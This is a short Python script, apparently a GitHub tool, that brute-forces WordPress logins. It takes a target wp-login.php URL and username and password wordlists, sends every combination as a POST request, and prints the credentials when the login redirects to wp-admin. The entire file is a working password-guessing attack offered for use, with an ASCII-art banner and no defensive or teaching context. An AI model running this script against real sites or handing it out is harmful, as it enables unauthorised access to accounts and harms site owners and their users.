import requests
from colorama import Fore, Back

ascii_art = r"""
     ,..~..,                    ¿o‾‾‾oP'
    d888a888zzzzzzzzzzzzzzzzzzzz8     8b
     8a8 8a8                    oP   ?b
     8 8 8 8                     ,ooo.

     -github.com/askudit
"""
print(ascii_art)

url = input("Enter the site: ")#"http://example.com/wp-login.php"

usern =input("Enter username list path: ")#r"D:\bruteforce\username.txt"
passw =input("Enter password list path: ")#r"D:\bruteforce\password.txt"

def bruteforce():

        with open(usern,"r") as usrnm:
            for usr in usrnm:
                usr = usr.strip()
                print(f"[*]trying {usr}",Fore.RED)

                with open(passw,"r") as pwds:
                    for passwo in pwds:
                        passwo = passwo.strip()
                        print(f"[*]trying {passwo}")
                
                        data = {
                            "log": usr,
                            "pwd": passwo
                        }

                        response = requests.post(url, data=data)
                        if "wp-admin" in response.url:
                            print(f"[+] username: {usr} password: {passwo}", Back.RED)
                            break
            
                        #else:
                         #   print("[-] Password not found in the dictionary.")

bruteforce()

